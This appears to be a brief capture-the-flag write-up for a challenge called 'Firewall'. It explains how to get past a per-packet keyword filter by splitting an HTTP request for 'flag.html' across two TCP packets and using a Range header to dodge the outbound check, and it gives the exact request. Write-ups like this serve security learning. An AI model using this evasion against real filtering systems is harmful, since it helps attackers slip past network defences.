#### Firewall
- points earned: 35
#### Notes / Intuition
- The firewall blocks any request or response with the keyword `flag` or the character `%`
- The firewall checks each TCP packet
- If the HTTP request is split across 2 TCP packets, then we can bypass the inbound checks.
- Since the `flag.html` content contains the keyword `flag` it will fail against outbound checks.
- The `Range:` header can be used to force the server to send back a part of the response content.

#### Solution
- Send 2 TCP packets splitting on the keyword `flag`
- Packet 1
```HTTP
GET /fla
```
- Packet 2
```HTTP
g.html HTTP/1.1\r\n
Host: 127.0.0.1:5000\r\n
Range: bytes=135-\r\n
Connection: close\r\n
\r\n
```
- The response will contain `flag.html` starting at byte 135 to the end which contains the flag
